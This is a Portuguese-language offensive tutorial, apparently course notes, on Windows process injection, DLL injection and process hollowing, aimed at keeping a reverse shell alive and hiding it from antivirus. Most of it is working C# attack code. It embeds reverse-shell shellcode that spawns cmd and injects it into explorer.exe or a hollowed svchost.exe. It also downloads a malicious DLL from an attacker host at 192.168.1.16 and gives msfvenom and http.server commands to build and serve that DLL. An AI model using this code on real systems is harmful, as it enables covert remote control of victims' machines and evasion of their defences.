# Sumário

- [Sumário](#sumário)
- [Migração ou Injeção de Processo](#migração-ou-injeção-de-processo)
  - [Explicação das API's que serão utilizadas](#explicação-das-apis-que-serão-utilizadas)
  - [Injeção do shellcode em outro processo](#injeção-do-shellcode-em-outro-processo)
- [Injeção de DLL](#injeção-de-dll)
  - [API utilizada](#api-utilizada)
  - [Explicação](#explicação)
  - [Código em C#](#código-em-c)
- [Técnica "Process Hollowing"](#técnica-process-hollowing)
  - [API's utilizadas](#apis-utilizadas)
  - [Explicação](#explicação-1)
  - [Código em C#](#código-em-c-1)

# Migração ou Injeção de Processo

* Quando obtermos o shell reverso de uma aplicação podem ocorrer algums situações inesperadas como: 
  * A vítima fechar o processo no qual iniciamos nosso shell reverso
  * O antivirus bloquear o acesso de um processo desconhecido à internet
* Dessa forma, ao migrar nosso shell reverso de um processo desconhecido, para um conhecido de mesmo privilégio como o "explorer.exe", toda a comunicação dele com a internet fica "um pouco mais legítima"
* Só é possível abrir um outro processo para se comunicar que possua o mesmo "nível de integridade" do que o usuário que solicitou o acesso

## Explicação das API's que serão utilizadas

```c
// Função que abre um canal de comunicação com outro processo
HANDLE OpenProcess(
	
	// Argumento que verifica o nível de acesso pedido ao processo
	// Para a injeção, será pedido o acesso PROCESS_ALL_ACCESS com a representação hexadecimal 0x001F0FFF
	DWORD dwDesiredAccess,
	// Esse argumento pergunta se o processo aberto irá herdar as mesmas permissões
	BOOL bInheritHandle,
	// O PID do processo em que queremos abrir a comunicação
	DWORD dwProcessId
);

// Função aloca espaço na memória de outro aplicativo
LPVOID VirtualAllocEx(
	// O valor que será usado é o retorno da função "OpenProcess"
	HANDLE hProcess,
	// Esse parâmetro serve para indicar o inicio do endereço em que a memória será alocada
	// para evitar erros vamos passar o valor nulo para deixar a API escolher esse endereço automaticamente
	LPVOID lpAddress,
	// Tamanho do espaço que será reservado
	SIZE_T dwSize,
	// Os tipos de atributos que queremos ao alocar o espaço
	// Serão utilizados MEM_COMMIT e MEM_RESERVE (0x1000 e 0x2000)
	DWORD flAllocationType, // 0x1000 | 0x2000 => 0x3000
	// O tipo de proteção utilizada será PAGE_EXECUTE_READWRITE representada pelo valor 0x40
	DWORD flProtect
);

// Função para escrever dentro de um espaço de memória de um processo aberto pela função "OpenProcess"
BOOL WriteProcessMemory(
	// O valor que será usado é o retorno da função "OpenProcess"
	HANDLE hProcess,
	// O valor que será usado é o retorno da função "VirtualAllocEx"
	LPVOID lpBaseAddress,
	// O buffer contendo o shellcode
	LPCVOID lpBuffer,
	// O tamanho do shellcode
	SIZE_T nSize,
	// Um ponteiro para receber quanto de espaço foi escrito durante a função
	SIZE_T *lpNumberOfBytesWritten
);

// Função para criar um thread utilizando o espaço de memória que foi alocado como endereço base
HANDLE CreateRemoteThread(
	// O valor que será usado é o retorno da função "OpenProcess"
	HANDLE hProcess,
	// Atributos para a nova thread criada, será utilizado 0 para aceitar os valores padrões
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	// Atributos para o tamanho da pilha, será utilizado 0 para aceitar os valores padrões
	SIZE_T dwStackSize,
	// O valor que será usado é o retorno da função "VirtualAllocEx"
	LPTHREAD_START_ROUTINE lpStartAddress,
	// Um ponteiro que receber os parâmtros que serão passados para a função
	// como não tem nenhum parâmetro, esse argumento será 0
	LPVOID lpParameter,
	DWORD dwCreationFlags,
	// Ponteiro que recebe o PID da thread criada, como isso não tem importância agora, será passado 0
	LPDWORD lpThreadId
);
```

## Injeção do shellcode em outro processo

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        static void Main(string[] args)
        {
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] buf = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
            0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
            0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x04,0xd2,
            0xc0,0xa8,0x00,0x7d,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
            0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
            0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
            0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
            0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,
            0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,
            0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,
            0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
            0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,
            0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,
            0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,
            0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,
            0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
            0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,
            0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,
            0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,
            0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
            0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
            0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};


            IntPtr outSize;

            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

    }
}
```
# Injeção de DLL

## API utilizada

```c
HMODULE LoadLibraryA(
    // Diretório da DLL a ser carregada
    LPCSTR lpLibFileName
);
```

## Explicação

* A função "LoadLibraryA" carrega uma DLL dentro de um processo, mas ela não pode ser chamada remotamente por outro processo
* Com isso a ideia é criar uma Thread dentro do processo ao qual queremos atacar e ela ser responsável por carregar a DLL dentro daquele processo, mas esbarramos em um problema, o ASLR

* Segundo o site "madiant" segue uma explicação do funcionamento do ASLR no windows

"ELF images, as used in the Linux implementation of ASLR, can use position-independent executables and position-independent code in shared libraries to supply a freshly randomized address space for the main program and all its libraries on each launch—sharing the same machine code between multiple processes even where it is loaded at different addresses. Windows ASLR does not work this way. Instead, each DLL or EXE image gets assigned a random load address by the kernel the first time it is used, and as additional instances of the DLL or EXE are loaded, they receive the same load address. If all instances of an image are unloaded and that image is subsequently loaded again, the image may or may not receive the same base address; see Fact 4. Only rebooting can guarantee fresh base addresses for all images systemwide."

As imagens ELF, conforme usadas na implementação Linux de ASLR, podem usar executáveis com posição idependente (PIE) e código independente de posição em bibliotecas compartilhadas (ASLR) para fornecer um espaço de endereço recém-aleatório para o programa principal e todas as suas bibliotecas em cada inicialização - compartilhando o mesmo código de máquina entre vários processos, mesmo quando é carregado em endereços diferentes. O ASLR do Windows não funciona dessa maneira. Em vez disso, cada imagem DLL ou EXE recebe um endereço de carregamento aleatório do kernel na primeira vez em que é usado e, à medida que instâncias adicionais do DLL ou EXE são carregadas, elas recebem o mesmo endereço de carregamento. Se todas as instâncias de uma imagem forem descarregadas e essa imagem for posteriormente carregada novamente, a imagem pode ou não receber o mesmo endereço base, dessa forma somente a reinicialização pode garantir novos endereços de base para todas as imagens em todo o sistema.

> Referência: https://www.mandiant.com/resources/blog/six-facts-about-address-space-layout-randomization-on-windows

* Como os endereços randômicos no Windows são setados na inicialização do sistema e não são individuais para cada EXE ou DLL é possível utilizar o mesmo endereço de uma função externa importada de uma DLL para outro processo
  * Nesse caso vamos carregar o endereço da função "LoadLibraryA" no nosso executável e utiliza-la no processo remoto

* Passo a passo:
  * Resolver o endereço da função "LoadLibraryA" dentro do processo o qual queremos atacar
  * Criar uma Thread e fazer ela carregar a DLL maliciosa

## Código em C#

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace InjectDLL
{
    class Program

    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)

        {
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\chucrutis.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.1.16:1235/chucrutis.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            // Função responsável por alocar um espaço na memória do processo atacado para passar 
            // o caminho da DLL que será carregada pela função "LoadLibraryA"
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;

            // Função responsável por escrever o caminho da DLL dentro do espaço de memória alocado
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            // Achando o endereço da função "LoadLibraryA" dentro da DLL kernel32
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }

    }
}
```

* Criando a dll unmanaged com o msfvenom e levantando um servidor web

```
[root@chucrutis /tmp] ➜ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.16 LPORT=1234 -f dll -o chucrutis.dll

[root@chucrutis /tmp] ➜ python3 -m http.server 1235
```

* Após a execução do programa, ele baixa a DLL do servidor Web e faz o programa alvo carregar essa DLL na memória


# Técnica "Process Hollowing"


## API's utilizadas

```c
BOOL CreateProcessW(
    // Nome da aplicação que será aberta
    LPCWSTR lpApplicationName,
    // O caminho do programa que será executado
    LPWSTR lpCommandLine,
    // Um ponteiro para uma estrutura SECURITY_ATTRIBUTES que determina se
    // o identificador retornado para o novo objeto de processo pode ser 
    // herdado por processos filho. Se lpProcessAttributes for NULL, o 
    // identificador não pode ser herdado.

    // O membro lpSecurityDescriptor da estrutura especifica um descritor
    // de segurança para o novo processo. Se lpProcessAttributes for NULL 
    // ou lpSecurityDescriptor for NULL, o processo obtém um descritor de 
    // segurança padrão.

    // Para o "Process Hollowing" colocaremos em nulo para receber as 
    // configurações padrões
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    // Como o parâmetro de cima, é um ponteiro para SECURITY_ATTRIBUTES,
    // mas iremos colocar nulo para obter os valores padrões
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    // Parâmetro setado para FALSO
    BOOL bInheritHandles,
    // Valor que define como o processo deve ser iniciado
    //
    // Valores possíveis:
    // CREATE_BREAKAWAY_FROM_JOB        => 0x01000000
    // CREATE_DEFAULT_ERROR_MODE        => 0x04000000
    // CREATE_NEW_CONSOLE               => 0x00000010
    // CREATE_NEW_PROCESS_GROUP         => 0x00000200
    // CREATE_NO_WINDOW                 => 0x08000000
    // CREATE_PROTECTED_PROCESS         => 0x00040000
    // CREATE_PRESERVE_CODE_AUTHZ_LEVEL => 0x02000000
    // CREATE_SECURE_PROCESS            => 0x00400000
    // CREATE_SEPARATE_WOW_VDM          => 0x00000800
    // CREATE_SHARED_WOW_VDM            => 0x00001000
    // CREATE_SUSPENDED                 => 0x00000004
    // CREATE_UNICODE_ENVIRONMENT       => 0x00000400
    // DEBUG_ONLY_THIS_PROCESS          => 0x00000002
    // DEBUG_PROCESS                    => 0x00000001
    // DETACHED_PROCESS                 => 0x00000008
    // EXTENDED_STARTUPINFO_PRESENT     => 0x00080000
    // INHERIT_PARENT_AFFINITY          => 0x00010000
    //
    // Para a técnica iremos utilizar a Flag CREATE_SUSPENDED
    DWORD dwCreationFlags,
    // Um ponteiro para o bloco de ambiente para o novo processo. Se este 
    // parâmetro for Nulo, o novo processo usará o ambiente do processo de 
    // chamada.
    LPVOID lpEnvironment,
    // O caminho completo de onde o executável irá atuar, se esse 
    // paramêtro for Nulo será utilizado o mesmo caminho do executável
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);
```
## Explicação

A técnica apresentada consiste em iniciar/criar um processo com o estado "CREATE_SUSPENDED" para que ele não execute. Depois disso, o EntryPoint do programa é substituído pelo shellcode em memória e seu estado é resumo em seguida.

O resultado dessa técnica é que iniciamos um processo autentico como o "svchost.exe" e substituimos o seu código em memória pelo shellcode, ou seja, quando abrimos o gerenciador de processo aparecerá o processo "svchost.exe" executando nosso shellcode.

Outro ponto importante é escolher executáveis que tenham alguma comunicação com a internet para que a comunicação do shellcode fique mais mascarada.

## Código em C#

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Threading.Tasks;

namespace hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
          string lpApplicationName,
          string lpCommandLine,
          IntPtr lpProcessAttributes,
          IntPtr lpThreadAttributes,
          bool bInheritHandles,
          uint dwCreationFlags,
          IntPtr lpEnvironment,
          string lpCurrentDirectory,
          [In] ref STARTUPINFO lpStartupInfo,
          out PROCESS_INFORMATION lpProcessInformation);

        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(
        IntPtr hProcess,
        int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        UInt32 ProcInfoLen,
        ref UInt32 retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
           IntPtr hProcess,
           IntPtr lpBaseAddress,
           byte[] lpBuffer,
           Int32 nSize,
           out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // Parse PE Header
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            byte[] buf = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
            0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
            0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x04,0xd2,
            0xc0,0xa8,0x05,0xae,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
            0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
            0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
            0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
            0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,
            0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,
            0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,
            0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
            0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,
            0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,
            0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,
            0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,
            0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
            0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,
            0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,
            0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,
            0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
            0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
            0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
```
